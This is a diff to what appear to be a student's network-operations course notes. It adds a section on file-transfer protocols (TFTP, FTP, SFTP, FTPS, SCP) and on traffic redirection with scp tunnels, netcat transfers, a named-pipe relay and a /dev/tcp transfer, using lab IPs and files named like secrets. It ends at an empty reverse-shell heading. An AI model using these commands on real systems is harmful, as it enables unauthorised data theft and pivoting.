@@ -479,24 +479,84 @@ Net Mapping:
 wget 10.50.21.41:21   -banner grab ftp server
   -R  ### recursivley grabs everything off server,
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DATA TRANSFER, MOVEMENT, AND REDIRECTION:
+    Common methods for transfering data:
+      TFTP:
+        RFC 1350 Rev2
+        UDP transport
+        Extremely small and very simple comms
+        no terminal communications ()
+        insecure (no auth or encryp)
+        no directory services
+        used often for tech such as BOOTP and PXE (remote image installs)
+      FTP:
+       RFC 959
+        TCP transport
+        Uses mult TCP conn
+        Control Conn (21)/ Data Conn(20)
+        Auth through clear-txt sign in (user/pass)
+        inseucre in default config
+        has directory services
+        can be enhanced with SSL/TLS (FTPS)
+        anon login
+        Active
+        Passive
+      SFTP:
+        TCP transp (22)
+        uses symmetric/asymmetric encryp
+        adds ftp like services to SSH
+        auth through sign in or SSH key
+        interactive terminal access
+      FTPS:
+        TCP transp (443)
+        adds SSL/TLs encryp to FTP
+        auth w/ user/pass and/or PKI
+        interactive terminal access
+        
+      ***SCP:
+        TCP transp (22)
+        uses auth thru sign in/SSH key
+        non interactive
+        symm/asymm encryp
+        Syntax ex:
+          $ scp student@172.16.82.106:secretstuff.txt /home/student     ### download file from remote dir to local dir
+          $ scp secretstuff.txt student@172.16.82.106:/home/student     ### upload file to remote dir from local dir
+          $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student    ### copy file from remote host to other remote host
+        SCP Syntax w/ alternate SSHD:
+          $ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student   ### download file from remote dir to local dir
+          $ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student   ### upload file to remote dir from local dir
+        SCP Syntax through a tunnel:
+          ssh student@172.16.82.106 -L 1111:localhost:22 -NT      ###ssh tunnel
+          $ scp -P 1111 student@localhost:secretstuff.txt /home/student   ### download file from a remote dir to local dir
+          $ scp -P 1111 secretstuff.txt student@localhost:/home/student   ### upload file to a remote dir from local dir
 
+      Class Ex:
+      -r ##3 copies directories
+        scp secret.txt  student@172.16.82.106:.   ##3 send secre.txt from my internet host to remote .106 to home directory of student with the same name ( indicated by '.')
 
+  ***Traffic Redirection Tools:
+    NETCAT:
+      NETCAT: Client to listener file transfer
+       Client (sends file): nc 10.2.0.2 9001 < file.txt
+       Listener (receive file): nc -l -p 9001 > newfile.txt
+      NETCAT: Listener to Client file transfer
+       Listener (sends file): nc -l -p 9001 < file.txt
+       Client (receive file): nc 10.2.0.2 9001 > newfile.txt
 
+      ****Named pipe:
+        mknod mypipe  ( mkfifio mypipe) ### makes named pipe
+        
+        blue host : nc -lp 3333 > mypile | nc -lp 4444 < mypipe
+        blue priv : nc 192.168.1.1 3333 < test
+        internet host : nc 172.16.82.106 4444 > secret.txt
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+      File trans with /dev/tcp: alt to netcat
+        nc -l -p 1111 > file.txt
+        cat file.txt > /dev/tcp/<IP>/<port>
+      
+      Reverse Shell using netcat:
+        
 
 
 
